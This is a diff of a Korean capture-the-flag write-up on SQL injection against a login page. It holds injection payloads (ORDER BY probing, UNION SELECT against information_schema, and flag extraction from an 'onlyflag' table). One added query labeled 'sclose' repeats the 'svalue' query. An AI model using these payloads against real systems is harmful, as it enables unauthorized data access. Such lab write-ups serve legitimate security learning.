@@ -4,9 +4,8 @@
 
 문제 페이지에는 `uid`, `upw` 로그인 입력창과 현재 실행될 SQL 쿼리가 보인다.
 
-```sql
-SELECT * FROM users WHERE uid='' AND upw='';
-```
+<img width="1917" height="475" alt="image" src="https://github.com/user-attachments/assets/9fed5037-ddba-414c-a645-314fa4c3d0ce" />
+
 
 ### 2. 코드 분석 — SQL Injection 발생 원인
 
@@ -38,7 +37,15 @@ if uid and upw:
 ' ORDER BY 4 #
 ```
 
+
 `ORDER BY n`은 n개 행을 가져오는 것이 아니라 **n번째 컬럼을 기준으로 정렬**한다. 확인 결과 `users` 조회 결과는 **4개 컬럼**이었다.
+
+
+<img width="603" height="442" alt="image" src="https://github.com/user-attachments/assets/f4b12a9b-ba32-4351-8d79-3a7d0981783b" />
+
+<img width="1027" height="224" alt="image" src="https://github.com/user-attachments/assets/1e425526-8fad-4ea9-964e-f354010900b7" />
+
+
 
 ### 4. UNION으로 테이블 목록 조회
 
@@ -50,7 +57,9 @@ FROM information_schema.tables
 WHERE table_schema=DATABASE() #
 ```
 
-**upw 입력값**: `1234`
+**upw 입력값**: `1234`(아무거나 입력해도 상관없음.)
+
+
 
 - `UNION SELECT` : 기존 조회 결과에 다른 조회 결과를 합친다.
 - `table_name` : 테이블 이름을 조회한다.
@@ -61,10 +70,8 @@ WHERE table_schema=DATABASE() #
 
 **조회 결과**
 
-```text
-users
-onlyflag
-```
+<img width="745" height="260" alt="image" src="https://github.com/user-attachments/assets/1a6758eb-ab0d-4832-9d57-4ed0bdb87d57" />
+
 
 ### 5. onlyflag 테이블의 컬럼 이름 확인
 
@@ -78,13 +85,10 @@ WHERE table_schema=DATABASE() AND table_name='onlyflag' #
 
 **조회 결과**
 
-```text
-idx
-sname
-svalue
-sflag
-sclose
-```
+<img width="696" height="502" alt="image" src="https://github.com/user-attachments/assets/5515cc81-3c0d-48f5-a04b-12b07fb0a0f8" />
+
+
+
 
 ### 6. FLAG 확인
 
@@ -94,7 +98,23 @@ sclose
 ' UNION SELECT sflag,NULL,NULL,NULL FROM onlyflag #
 ```
 
-> 위 마지막 구문은 확인된 테이블·컬럼명을 바탕으로 만든 **조회 예시**다. 실제 FLAG를 얻을 때 전송한 최종 요청 원문은 제공되지 않았으므로, 이 구문으로 획득했다고 단정하지 않는다.
+svalue
+
+```sql
+' UNION SELECT svalue,NULL,NULL,NULL FROM onlyflag #
+```
+
+sclose
+
+```sql
+' UNION SELECT svalue,NULL,NULL,NULL FROM onlyflag #
+```
+
+<img width="850" height="209" alt="image" src="https://github.com/user-attachments/assets/fab9cc1c-0d05-4e96-817a-d9fd946e8fc6" />
+
+<img width="891" height="214" alt="image" src="https://github.com/user-attachments/assets/08d9d9fe-0a93-481b-a165-ed58bec80fce" />
+
+<img width="883" height="363" alt="image" src="https://github.com/user-attachments/assets/3d1b5e42-a0e7-477e-bc12-40fe731a9afd" />
 
 **확인한 FLAG**
 
